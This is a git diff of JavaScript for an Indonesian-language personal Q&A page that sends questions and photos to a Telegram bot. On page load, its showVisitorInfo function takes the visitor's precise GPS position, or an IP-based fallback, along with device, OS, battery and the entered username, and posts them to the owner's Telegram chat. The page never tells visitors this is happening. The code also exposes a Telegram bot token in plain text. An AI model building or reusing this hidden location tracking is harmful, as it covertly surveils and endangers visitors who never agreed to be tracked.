@@ -8,27 +8,98 @@ openPhotoOptions.addEventListener('click', () => {
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-const music=document.getElementById('bgmusic');
-const btnMusic=document.getElementById('musicButton');
-let started=false;music.volume=0.4;
-async function startMusic(){if(started)return;started=true;music.muted=false;try{await music.play();btnMusic.classList.remove("show");}catch(err){btnMusic.classList.add("show");}}
-document.addEventListener('click',startMusic,{once:true});
-document.addEventListener('touchstart',startMusic,{once:true});
-btnMusic.addEventListener('click',async()=>{try{await music.play();btnMusic.classList.remove("show");}catch(e){console.log(e);}});
+// === BAGIAN MUSIK — REVISI MOBILE FRIENDLY ===
+const music = document.getElementById('bgmusic');
+const btnMusic = document.getElementById('musicButton');
+let started = false;
+music.volume = 0.4;
 
-const modal=document.getElementById('modal');
-document.getElementById('openAsk').onclick=()=>modal.classList.add('show');
-document.getElementById('closeQ').onclick=()=>modal.classList.remove('show');
-const overlay=document.getElementById("blurOverlay"),
-input=document.getElementById("igInput"),
-btnLogin=document.getElementById("igSubmit"),
-savedIG=localStorage.getItem("ig_user");
-function removeOverlay(){overlay.style.opacity="0";overlay.style.pointerEvents="none";setTimeout(()=>overlay.style.display="none",300);}
-function showUserStatus(n){const e=document.getElementById("igStatus");e.textContent=`👉🏻 Login sebagai ${n} (keluar)`;e.style.display="block";e.onclick=()=>{if(confirm("Keluar?")){localStorage.removeItem("ig_user");setTimeout(()=>location.reload(),400);}};}
-if(savedIG){removeOverlay();showUserStatus(savedIG);}
-btnLogin.onclick=()=>{const u=input.value.trim();if(!u)return alert("Masukkan username dulu");localStorage.setItem("ig_user",u);showUserStatus(u);removeOverlay();};
+// pastikan audio bisa dimulai hanya setelah interaksi nyata
+async function startMusic() {
+  if (started) return;
+  started = true;
+  music.muted = false;
+  try {
+    await music.play();
+    btnMusic.classList.remove("show");
+    btnMusic.disabled = true;
+  } catch (err) {
+    console.log("Autoplay gagal:", err);
+    btnMusic.classList.add("show");
+  }
+}
 
-// universal send animation + swoosh
+// Deteksi platform mobile
+const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);
+
+// PC: boleh langsung trigger setelah klik/touch pertama
+document.addEventListener('click', startMusic, { once: true });
+document.addEventListener('touchstart', startMusic, { once: true });
+
+// tombol utama tetap jadi pemicu manual (aman di mobile)
+btnMusic.addEventListener('click', async () => {
+  try {
+    await music.play();
+    music.muted = false;
+    started = true;
+    btnMusic.classList.remove("show");
+    btnMusic.disabled = true;
+  } catch (e) {
+    alert("Browser kamu memblokir musik otomatis. Coba ketuk ulang tombol 🎵");
+    console.log(e);
+  }
+});
+
+// tambahan: khusus mobile, pastikan tombol tampil dari awal agar user tahu
+if (isMobile) {
+  btnMusic.classList.add("show");
+  music.muted = true;
+  // hilangkan autoplay otomatis agar tidak error
+} else {
+  // desktop: bisa coba autoplay kecil setelah delay
+  setTimeout(() => { startMusic(); }, 800);
+}
+
+// === MODAL PERTANYAAN ===
+const modal = document.getElementById('modal');
+document.getElementById('openAsk').onclick = () => modal.classList.add('show');
+document.getElementById('closeQ').onclick = () => modal.classList.remove('show');
+
+// === LOGIN INSTAGRAM ===
+const overlay = document.getElementById("blurOverlay"),
+  input = document.getElementById("igInput"),
+  btnLogin = document.getElementById("igSubmit"),
+  savedIG = localStorage.getItem("ig_user");
+
+function removeOverlay() {
+  overlay.style.opacity = "0";
+  overlay.style.pointerEvents = "none";
+  setTimeout(() => overlay.style.display = "none", 300);
+}
+function showUserStatus(n) {
+  const e = document.getElementById("igStatus");
+  e.textContent = `👉🏻 Login sebagai ${n} (keluar)`;
+  e.style.display = "block";
+  e.onclick = () => {
+    if (confirm("Keluar?")) {
+      localStorage.removeItem("ig_user");
+      setTimeout(() => location.reload(), 400);
+    }
+  };
+}
+if (savedIG) {
+  removeOverlay();
+  showUserStatus(savedIG);
+}
+btnLogin.onclick = () => {
+  const u = input.value.trim();
+  if (!u) return alert("Masukkan username dulu");
+  localStorage.setItem("ig_user", u);
+  showUserStatus(u);
+  removeOverlay();
+};
+
+// === FUNGSI KIRIM TELEGRAM UNIVERSAL ===
 async function sendTelegramMessage(url, body, el) {
   el.innerHTML = `
     <div class="mailContainer">
@@ -42,10 +113,10 @@ async function sendTelegramMessage(url, body, el) {
       try {
         const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
         swoosh.volume = 0.45;
-        swoosh.play().catch(()=>{});
-      } catch(e){}
+        swoosh.play().catch(() => {});
+      } catch (e) {}
       el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
-      setTimeout(()=>el.innerHTML="",3000);
+      setTimeout(() => el.innerHTML = "", 3000);
       return true;
     } else {
       el.textContent = "💔 Gagal mengirim.";
@@ -57,63 +128,76 @@ async function sendTelegramMessage(url, body, el) {
   }
 }
 
-// send question (modal)
-document.getElementById('sendQ').addEventListener('click', async()=>{
+// === KIRIM PERTANYAAN ===
+document.getElementById('sendQ').addEventListener('click', async () => {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
   const text = document.getElementById('qtext').value.trim();
   const qmsg = document.getElementById('qmsg');
-  if(!text){qmsg.textContent="Isi pertanyaan dulu.";return;}
+  if (!text) {
+    qmsg.textContent = "Isi pertanyaan dulu.";
+    return;
+  }
   await sendTelegramMessage(
     `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-    {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:`💬 Pertanyaan dari ${savedUser}\n${text}`})},
+    { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 Pertanyaan dari ${savedUser}\n${text}` }) },
     qmsg
   );
-  setTimeout(()=>{ if(qmsg.textContent.includes("Terkirim") || qmsg.innerText.includes("Terkirim")) modal.classList.remove('show'); }, 900);
+  setTimeout(() => { if (qmsg.textContent.includes("Terkirim")) modal.classList.remove('show'); }, 900);
 });
 
-// take photo / preview
-const takeBtn=document.getElementById("takePhoto");
-const photoInput=document.getElementById("photoInput");
-takeBtn.onclick=async()=>{
-  try{
-    const cameraInput=document.createElement("input");
-    cameraInput.type="file";cameraInput.accept="image/*";cameraInput.capture="user";
+// === KIRIM FOTO ===
+const takeBtn = document.getElementById("takePhoto");
+const photoInput = document.getElementById("photoInput");
+const preview = document.getElementById("photoPreview");
+
+takeBtn.onclick = async () => {
+  try {
+    const cameraInput = document.createElement("input");
+    cameraInput.type = "file";
+    cameraInput.accept = "image/*";
+    cameraInput.capture = "user";
     cameraInput.click();
-    cameraInput.onchange=()=>{
-      if(cameraInput.files.length>0){
+    cameraInput.onchange = () => {
+      if (cameraInput.files.length > 0) {
         photoInput.files = cameraInput.files;
         const reader = new FileReader();
         reader.onload = (e) => { preview.src = e.target.result; preview.style.display = "block"; };
         reader.readAsDataURL(cameraInput.files[0]);
       }
     };
-  }catch(e){alert("Kamera tidak tersedia");}
+  } catch (e) { alert("Kamera tidak tersedia"); }
 };
-photoInput.addEventListener('change',()=>{ if(photoInput.files && photoInput.files[0]){ const reader=new FileReader(); reader.onload=()=>{}; reader.readAsDataURL(photoInput.files[0]); } });
-
-// send photo
-document.getElementById("sendPhoto").addEventListener('click', async()=>{
+photoInput.addEventListener('change', () => {
+  if (photoInput.files && photoInput.files[0]) {
+    const reader = new FileReader();
+    reader.onload = () => {};
+    reader.readAsDataURL(photoInput.files[0]);
+  }
+});
+document.getElementById("sendPhoto").addEventListener('click', async () => {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
   const fileInput = document.getElementById("photoInput");
   const file = fileInput.files && fileInput.files[0];
   const caption = document.getElementById("caption").value;
   const statusEl = document.getElementById("status");
-  if(!file){statusEl.textContent="Pilih foto dulu.";return;}
+  if (!file) { statusEl.textContent = "Pilih foto dulu."; return; }
   const fd = new FormData();
   fd.append("chat_id", CHAT_ID);
   fd.append("caption", `📸 Foto dari ${savedUser}\n${caption}`);
   fd.append("photo", file);
   const ok = await sendTelegramMessage(
     `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-    {method:"POST", body: fd},
+    { method: "POST", body: fd },
     statusEl
   );
-  if(ok){
-    fileInput.value=""; document.getElementById("caption").value=""; preview.style.display="none";
+  if (ok) {
+    fileInput.value = "";
+    document.getElementById("caption").value = "";
+    preview.style.display = "none";
   }
 });
 
-// versi ringkas & akurat: hanya GPS ➜ IP fallback
+// === INFO PENGUNJUNG ===
 async function showVisitorInfo() {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
   async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
@@ -124,17 +208,16 @@ async function showVisitorInfo() {
         : "https://www.google.com/maps";
       const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
       const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
-                 /Android/i.test(navigator.userAgent) ? "Android" :
-                 /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
-                 /Mac/i.test(navigator.userAgent) ? "MacOS" :
-                 /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
+        /Android/i.test(navigator.userAgent) ? "Android" :
+        /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
+        /Mac/i.test(navigator.userAgent) ? "MacOS" :
+        /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
       let batteryInfo = "Tidak diketahui";
       try {
         const battery = await navigator.getBattery();
         batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
       } catch {}
-      const msg =
-`📢 Pengunjung Baru!
+      const msg = `📢 Pengunjung Baru!
 👤 ${savedUser}
 🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
 🗺️ Maps: ${mapLink}
@@ -152,57 +235,99 @@ async function showVisitorInfo() {
       });
     } catch (err) { console.error("❌ Gagal kirim info:", err); }
   }
-  async function getBestGPS(samples = 5) {
-    return new Promise((resolve, reject) => {
-      if (!navigator.geolocation) return reject("Geolocation tidak didukung");
-      const results = [];
-      const opts = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
-      function capture() {
-        navigator.geolocation.getCurrentPosition(pos => {
-          results.push(pos.coords);
-          if (results.length >= samples) {
-            const best = results.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
-            resolve(best);
-          } else setTimeout(capture, 700);
-        }, err => {
-          if (results.length > 0) {
-            const best = results.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
-            resolve(best);
-          } else reject(err);
-        }, opts);
-      }
-      capture();
-    });
-  }
   try {
-    const coords = await getBestGPS(6);
-    const { latitude, longitude, accuracy } = coords;
+    const coords = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
+    });
+    const { latitude, longitude, accuracy } = coords.coords;
     const ipData = await (await fetch("https://ipwho.is/")).json();
     await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
-  } catch (gpsErr) {
-    try {
-      const d = await (await fetch("https://ipwho.is/")).json();
-      await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
-    } catch { await sendToTelegram({}, null, null, "Fixed"); }
+  } catch {
+    const d = await (await fetch("https://ipwho.is/")).json();
+    await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
   }
 }
 showVisitorInfo();
-setTimeout(()=>{ startMusic(); },700);
 
-// butterflies animation
-(function(){ /* ... animasi kupu kode lama tetap ... */ })();
+// === EFEK BUTTERFLY 💸 ===
+(function(){
+  const area = document.querySelector('.card');
+  const butterflies = [];
+  const butterflyCount = 7;
+  let holdActive = false;
+  let holdX = 0;
+  let holdY = 0;
+  area.style.position = 'relative';
+  area.style.overflow = 'hidden';
+  function getBounds(){ const rect=area.getBoundingClientRect(); return { width: area.clientWidth, height: area.clientHeight, left: rect.left, top: rect.top }; }
+  const bounds = getBounds();
+  for(let i=0;i<butterflyCount;i++){
+    const b=document.createElement('div'); b.className='butterfly'; b.textContent='💸'; area.appendChild(b);
+    butterflies.push({ el:b, x:Math.random()*bounds.width, y:Math.random()*bounds.height, vx:(Math.random()-0.5)*1.2, vy:(Math.random()-0.5)*1.2, size:16+Math.random()*10, flapOffset:Math.random()*Math.PI*2 });
+    b.style.fontSize = butterflies[i].size + 'px';
+  }
+  function moveButterflies(){
+    const rect = getBounds();
+    const time = performance.now()/200;
+    butterflies.forEach(b=>{
+      b.vy += 0.002;
+      if(holdActive){ const dx=holdX-b.x; const dy=holdY-b.y; b.vx += dx*0.002; b.vy += dy*0.002; }
+      b.vx += Math.sin(time + b.flapOffset)*0.04;
+      b.vy += Math.cos(time + b.flapOffset)*0.02;
+      b.x += b.vx; b.y += b.vy;
+      if(b.x <= 0 || b.x >= rect.width - b.size) b.vx *= -0.8;
+      if(b.y <= 0 || b.y >= rect.height - b.size) b.vy *= -0.8;
+      b.vx = Math.max(-1.8, Math.min(1.5, b.vx));
+      b.vy = Math.max(-1.8, Math.min(1.8, b.vy));
+      const flap = Math.sin(time*8 + b.flapOffset)*20;
+      b.el.style.left = b.x + 'px'; b.el.style.top = b.y + 'px';
+      b.el.style.transform = `rotate(${flap}deg) scale(${1 + Math.sin(time*4 + b.flapOffset)*0.05})`;
+    });
+    requestAnimationFrame(moveButterflies);
+  }
+  moveButterflies();
+  const startHold=(x,y)=>{ const rect=getBounds(); holdActive=true; holdX=x-rect.left; holdY=y-rect.top; };
+  const moveHold=(x,y)=>{ if(holdActive){ const rect=getBounds(); holdX=x-rect.left; holdY=y-rect.top; } };
+  const endHold=()=> holdActive=false;
+  area.addEventListener('mousedown', e=> startHold(e.clientX,e.clientY));
+  area.addEventListener('mousemove', e=> moveHold(e.clientX,e.clientY));
+  area.addEventListener('mouseup', endHold);
+  area.addEventListener('mouseleave', endHold);
+  area.addEventListener('touchstart', e=>{ const t=e.touches[0]; startHold(t.clientX,t.clientY); });
+  area.addEventListener('touchmove', e=>{ const t=e.touches[0]; moveHold(t.clientX,t.clientY); });
+  area.addEventListener('touchend', endHold);
+  area.addEventListener('touchcancel', endHold);
+})();
 
-// === Status Spotify lama ===
+// === LIVE MODE STATUS ===
 (async function(){
   const titleEl = [...document.querySelectorAll('*')].find(e => /sharing vibes & question/i.test(e.textContent));
   if(!titleEl) return;
   const parentEl = titleEl.parentElement || document.body;
+
   const statusBox = document.createElement("div");
   statusBox.id = "liveModeStatus";
-  statusBox.style.cssText = `width:100%;display:block;text-align:center;font-size:14px;font-family:'Poppins', monospace;color:#cfcfcf;opacity:0;transform:translateY(6px);transition:opacity .6s ease, transform .6s ease, color .6s ease;margin-top:6px;margin-bottom:4px;letter-spacing:0.4px;user-select:none;position:relative;`;
+  statusBox.style.cssText = `
+    width:100%;
+    display:block;
+    text-align:center;
+    font-size:14px;
+    font-family:'Poppins', monospace;
+    color:#cfcfcf;
+    opacity:0;
+    transform:translateY(6px);
+    transition:opacity .6s ease, transform .6s ease, color .6s ease;
+    margin-top:6px;
+    margin-bottom:4px;
+    letter-spacing:0.4px;
+    user-select:none;
+    position:relative;
+  `;
+
   const musicBtn = parentEl.querySelector("#musicButton");
   if (musicBtn) musicBtn.insertAdjacentElement("beforebegin", statusBox);
   else titleEl.insertAdjacentElement("afterend", statusBox);
+
   async function updateStatus(){
     try {
       const res = await fetch("https://sybau.imamadevera.workers.dev/status", {cache:"no-store"});
@@ -212,10 +337,12 @@ setTimeout(()=>{ startMusic(); },700);
       const ago = diff < 1 ? "Music" : `${Math.floor(diff)}m ago`;
       const text = `${data.status} (${ago})`;
       if (statusBox.textContent !== text) {
-        statusBox.style.opacity = 0;statusBox.style.transform = "translateY(6px)";
+        statusBox.style.opacity = 0;
+        statusBox.style.transform = "translateY(6px)";
         setTimeout(() => {
           statusBox.textContent = text;
-          statusBox.style.opacity = 1;statusBox.style.transform = "translateY(0)";
+          statusBox.style.opacity = 1;
+          statusBox.style.transform = "translateY(0)";
           let color = "#fff";
           if (data.status.includes("Online")) color = "#00ffb3";
           else if (data.status.includes("Listening")) color = "#4cc9ff";
@@ -225,41 +352,146 @@ setTimeout(()=>{ startMusic(); },700);
       }
     } catch {
       statusBox.textContent = "⚠️ gagal memuat status";
-      statusBox.style.color = "#ff7979";statusBox.style.opacity = 1;statusBox.style.transform = "translateY(0)";
+      statusBox.style.color = "#ff7979";
+      statusBox.style.opacity = 1;
+      statusBox.style.transform = "translateY(0)";
     }
   }
-  updateStatus();setInterval(updateStatus, 4000);
+
+  updateStatus();
+  setInterval(updateStatus, 4000);
 })();
 
-// === Tambahan Preview Cover Spotify ===
-(function(){
-  const statusBox = document.getElementById("liveModeStatus");
-  if (!statusBox) return;
-  async function showSpotifyPreview() {
-    try {
-      const res = await fetch("https://sybau.imamadevera.workers.dev/status",{cache:"no-store"});
-      const data = await res.json();
-      if (data.status && data.status.includes("Listening") && data.cover) {
-        const oldPrev=document.getElementById("spotifyCoverPreview"); if(oldPrev) oldPrev.remove();
-        const wrap=document.createElement("div"); wrap.id="spotifyCoverPreview"; wrap.style.cssText="text-align:center;margin-top:6px;animation:fadeIn .6s ease;";
-        const img=document.createElement("img"); img.src=data.cover; img.alt="Now Playing"; img.style.cssText="width:90px;height:90px;border-radius:12px;box-shadow:0 0 10px rgba(0,0,0,0.4);display:block;margin:0 auto 6px;";
-        const title=document.createElement("div"); title.textContent=data.status.replace('🎧 Listening on Spotify — ',''); title.style.cssText="color:#b6e3ff;font-size:13px;font-family:'Poppins',sans-serif;margin-top:4px;opacity:0.9;";
-        const style=document.createElement("style"); style.textContent="@keyframes fadeIn{from{opacity:0;transform:translateY(4px);}to{opacity:1;transform:translateY(0);}}"; document.head.appendChild(style);
-        wrap.appendChild(img); wrap.appendChild(title); statusBox.insertAdjacentElement("afterend", wrap);
-      } else {
-        const oldPrev=document.getElementById("spotifyCoverPreview"); if(oldPrev) oldPrev.remove();
-      }
-    } catch(e){console.warn("Gagal menampilkan Spotify preview:", e);}
-  }
-  showSpotifyPreview();
-  setInterval(showSpotifyPreview, 5000);
-})();
-
-// === Browser Warning ===
+// === DETEKSI INSTAGRAM / FB BROWSER ===
 const ua = navigator.userAgent || navigator.vendor || window.opera;
 if (ua.includes("Instagram") || ua.includes("FBAV") || ua.includes("FBAN")) {
   const warn = document.createElement("div");
   warn.textContent = "buka lewat Chrome";
-  warn.style.cssText = "position: fixed; top: 0; left: 0; width: 100%; background: #ffcd4c; color: #000; padding: 10px; text-align: center; font-weight: 600; z-index: 9999; font-family: Inter, system-ui, sans-serif;";
+  warn.style.cssText = `
+    position: fixed; top: 0; left: 0; width: 100%;
+    background: #ffcd4c; color: #000; padding: 10px;
+    text-align: center; font-weight: 600; z-index: 9999;
+    font-family: Inter, system-ui, sans-serif;
+  `;
   document.body.appendChild(warn);
 }
+
+// === SPOTIFY PREVIEW TAMBAHAN (tidak mengubah fungsi lama) ===
+(async function(){
+  const API_URL = "https://sybau.imamadevera.workers.dev/spotify"; // endpoint worker baru kamu
+
+  const statusEl = document.getElementById("liveModeStatus");
+  if (!statusEl) return; // kalau belum ada elemen status, stop
+
+  // Buat container
+  const box = document.createElement("div");
+  box.id = "spotifyPreviewBox";
+  box.style.cssText = `
+    width:100%;
+    text-align:center;
+    margin-top:8px;
+    transition:opacity .4s ease;
+    opacity:0;
+  `;
+
+  // Cover
+  const cover = document.createElement("img");
+  cover.id = "spotifyPreviewCover";
+  cover.style.cssText = `
+    width:90%;
+    max-width:240px;
+    border-radius:16px;
+    margin-top:6px;
+    display:none;
+    box-shadow:0 0 20px rgba(76,201,255,0.25);
+  `;
+
+  // Progress bar
+  const wrap = document.createElement("div");
+  wrap.style.cssText = `
+    width:90%;
+    height:6px;
+    background:rgba(255,255,255,0.15);
+    border-radius:4px;
+    margin:8px auto 0;
+    overflow:hidden;
+  `;
+  const bar = document.createElement("div");
+  bar.style.cssText = `
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg,#4cc9ff,#b5179e);
+    transition:width .3s linear;
+  `;
+  wrap.appendChild(bar);
+
+  box.appendChild(cover);
+  box.appendChild(wrap);
+  statusEl.insertAdjacentElement("afterend", box);
+
+  async function refreshSpotify(){
+    try {
+      const res = await fetch(API_URL, {cache:"no-store"});
+      const data = await res.json();
+
+      if (data.cover) {
+        cover.src = data.cover;
+        cover.style.display = "block";
+      } else {
+        cover.style.display = "none";
+      }
+
+      if (data.progress_ms && data.duration_ms) {
+        const percent = Math.min((data.progress_ms / data.duration_ms) * 100, 100);
+        bar.style.width = percent + "%";
+      } else {
+        bar.style.width = "0%";
+      }
+
+      box.style.opacity = 1;
+    } catch(e) {
+      console.warn("Spotify preview error:", e);
+    }
+  }
+
+  refreshSpotify();
+  setInterval(refreshSpotify, 15000); // refresh setiap 15 detik
+})();
+
+
+// === REVISI SPOTIFY PREVIEW TERINTEGRASI ===
+(async function(){
+  const API_URL = "https://sybau.imamadevera.workers.dev/spotify";
+  const liveStatus = document.getElementById("liveModeStatus");
+  if (!liveStatus) return;
+
+  const spotifyBox = document.createElement("div");
+  spotifyBox.id = "spotifyPreviewBox";
+  spotifyBox.style.cssText = "width:100%;text-align:center;margin-top:8px;transition:opacity .4s ease;opacity:0;";
+
+  const cover = document.createElement("img");
+  cover.id = "spotifyPreviewCover";
+  cover.style.cssText = "width:90%;max-width:240px;border-radius:16px;margin-top:6px;display:none;box-shadow:0 0 20px rgba(76,201,255,0.25);";
+
+  const progressWrap = document.createElement("div");
+  progressWrap.style.cssText = "width:90%;height:6px;background:rgba(255,255,255,0.15);border-radius:4px;margin:8px auto 0;overflow:hidden;";
+  const bar = document.createElement("div");
+  bar.style.cssText = "height:100%;width:0%;background:linear-gradient(90deg,#4cc9ff,#b5179e);transition:width .3s linear;";
+  progressWrap.appendChild(bar);
+  spotifyBox.appendChild(cover);
+  spotifyBox.appendChild(progressWrap);
+  liveStatus.insertAdjacentElement("afterend", spotifyBox);
+
+  async function updateSpotify(){
+    try{
+      const res = await fetch(API_URL,{cache:"no-store"});
+      const data = await res.json();
+      if(data.cover){cover.src=data.cover;cover.style.display="block";}else cover.style.display="none";
+      if(data.progress_ms&&data.duration_ms){const p=Math.min((data.progress_ms/data.duration_ms)*100,100);bar.style.width=p+"%";}else bar.style.width="0%";
+      spotifyBox.style.opacity=1;
+    }catch(e){console.warn("Spotify preview error:",e);}
+  }
+
+  updateSpotify();
+  setInterval(updateSpotify,15000);
+})();
